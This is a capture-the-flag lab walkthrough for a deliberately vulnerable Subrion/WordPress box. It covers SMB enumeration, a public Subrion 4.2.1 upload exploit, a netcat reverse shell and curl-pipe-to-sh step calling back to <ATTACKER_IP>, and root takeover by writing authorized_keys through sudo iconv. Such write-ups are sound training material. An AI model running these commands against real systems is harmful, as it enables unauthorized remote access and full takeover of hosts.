# Enumeration

## \[+] 10.10.253.120 - tech.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.253.120 tech.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.253.120
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 139/445 - SMB

To enumerate SMB on ports 139 and 445, we can use [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) to interact with the service. The option `--no-pass` will attempt to authenticate without any credentials and `-L` will list the shares:

```sh
smbclient --no-pass -L //$RHOSTS
```

`IPC$` and `print$` are standard sharenames, so let's check out `websvr` by using the following commands:

```sh
smbclient --no-pass //$RHOSTS/websvr
ls
```

![ba8d122d1619ab9c6810a7af6d383fba.png](/resources/45cfe2b49a6c44b5adea2b9cd3e442ae.png)

There is a single text file in this share, `enter.txt`. Using the `get` command followed by the filename, we can download this file locally onto our attacking machine:

```sh
get enter.txt
```

![d661b3ba6a77becc87ef95c611ba372a.png](/resources/1927501ef9794fc58f87365856870ef3.png)

After downloading the text file, we can exit `smbclient` by using the `exit` command. Then check the contents of the file using `cat` where we will find a note with the credentials to a Subrion site:

```sh
exit
cat enter.txt
```

![9bf5b959acf69f27ac9a73034890027f.png](/resources/acc9e69c897d4d4a948a8adbf73234d7.png)

## \[+] Port 80 - HTTP

### \[-] tech.thm/subrion/

![a75263b786941bb8ed591709a672722b.png](/resources/ad618fa3474f423b8128a63a7f84bc56.png)

Just like the note said, this URL does not work, but if we append `panel/` to it, we can still access the admin panel.

### \[-] tech.thm/subrion/panel/

![714745027e34544ab8e0a843b8eb4151.png](/resources/d7cad0600b574a519f6f29d88d03d366.png)

Before we can use the credentails we found in the note, we will have to feed the password into [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base58\('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false\)From_Base32\('A-Z2-7%3D',false\)From_Base64\('A-Za-z0-9%2B/%3D',true,false\)\&input=N3NLdm50WGRQRUpheGF6Y2U5UFhpMjR6YUZyTGlLV0Nr) to decode it:

After decoding the password we can log into the admin panel:

![4474d94c120d4381679d3ba29d32789e.png](/resources/776dea3c52e34bc5a40e6c052333cedb.png)

# Initial Foothold

### \[-] www-data\@TechSupport

Scrolling down a bit, we will find the Subrion version number 4.2.1:

![eb4886730fccceebc904707234aac1c8.png](/resources/a1a1dd87ee05453a81f2cb765d48b18d.png)

Searching for "subrion 4.2.1 exploit" leads us to this [exploit by Fellipe Oliveira and Swammers8](https://github.com/Swammers8/SubrionCMS-4.2.1-File-upload-RCE-auth-/blob/main/exploit.py). The exploit attempts to upload a PHP web shell but with the PHAR extension since it is not blocked in the `.htaccess` file ([CVE-2018-19422](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19422)).

After saving the exploit, we can run it using `python3`:

```sh
python3 exploit.py -u http://tech.thm/subrion/panel/ -l <USERNAME> -p <PASSWORD>
```

![c32d0c5e0cd37bccddcabaf420b3be36.png](/resources/cf510e456df14877b95e297c4dcfc506.png)

This shell is limited as we cannot change directories and do any proper enumeration. We can upgrade our shell by creating a reverse shell bash script on our attacking machine, then download and run the script on the victim machine.

We will first need to create a bash script with the reverse shell command:

```sh
#!/usr/bin/env bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Save it as `shell.sh` then host it using Python:

```sh
python3 -m http.server 8888
```

Next, start a [Netcat](https://linux.die.net/man/1/nc) listener:

```sh
nc -nvlp 4444
```

The command we will send to the current shell will download our bash script, pipe it to bash to run the script and we should get a connection back to our Netcat listener:

```plaintext
curl <ATTACKER_IP>:8888/shell.sh | sh
```

The terminal which we just ran the `curl` command will be unavailable (unless you close the script with `CTRL+C`) but if we check to the new terminal running Netcat, we will have our upgraded shell:

Let's stablize the shell we just got by doing the following steps:

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` ... Use Python to spawn a stable shell
2. `CTRL + Z` ... Backgrounds the current shell
3. `stty raw -echo;fg` ... Fixes echoing and foregrounds the shell
4. `export TERM=xterm-256color` ... Sets terminal to xterm

# Privilege Escalation

### \[-] scamsite\@TechSupport

Let's navigate to the WordPress installation directory by using the `cd /var/www/html/wordpress` command and list the files using `ls -lah`:

```sh
cd /var/www/html/wordpress
ls -lah
```

![e6b2cd6a9cc889a74186d850865d5111.png](/resources/ab5a5d07efc64dd5bbc95fcc41c311b0.png)

We can check the contents of the `wp-config.php` to see if we can find any credentials:

```sh
cat wp-config.php
```

![a6728d7f7564868d0dfe16c11d748594.png](/resources/86e66229b59242b08209d1cba4bbd36f.png)

Let's try to re-use this password on the `scamsite` account by using the [su](https://linux.die.net/man/1/su) command and enter the password when prompted:

```sh
su scamsite
```

Afer logging as the user `scamsite`, change to their home directory and check the `.bash_history` file for any useful commands (or typos) the user previously ran:

```sh
cd /home/scamsite/
cat .bash_history
```

![98683deddbb5ce0aadaa937b6447a854.png](/resources/8b05a69bae674c828bcec900591352bb.png)

The highlighted command above looks interesting since the user ran it with `sudo`. Let's check to see if we can still run it by checking the permissions using `sudo -l`:

```sh
sudo -l
```

![c8864dd45d7871512364352b46212ec9.png](/resources/288490472c5f46548f904a7a9509a210.png)

Now that we have confirmed we still can use `sudo` on the `iconv` binary, let's try to run the same command:

```sh
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

![94077ca252a0d4d87158db2474936f17.png](/resources/559c1b3161044644a568de8f76f1968c.png)

### \[-] root\@ScamSite

To escalate to the user `root`, we can use the same `sudo` privilege to overwrite the `id_rsa` file of the root user with our own SSH key then log in as `root`.

On the attacking machine, we generate our SSH keys using the following command and configure it with a password, etc. if you'd like and save the file to a directory related to this lab (so you don't overwrite any existing SSH keys) with the filename `id_rsa`:

```sh
ssh-keygen
```

Use `cat` on `id_rsa.pub` file and copy the contents to the clipboard then modify the following command with your SSH key:

```sh
echo '<ID_RSA.PUB-GOES-HERE>' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```

Then on the victim machine, run the command to overwrite the root user's SSH keys with your own.

Back on the attacking machine, use the [chmod](https://linux.die.net/man/1/chmod) command on the `id_rsa` file to give it the proper permissions:

```sh
chmod 600 id_rsa
```

Then use the [ssh](https://linux.die.net/man/1/ssh) command with the `-i` flag to use the `id_rsa` file to connect:

```sh
ssh -i id_rsa root@$RHOSTS
```
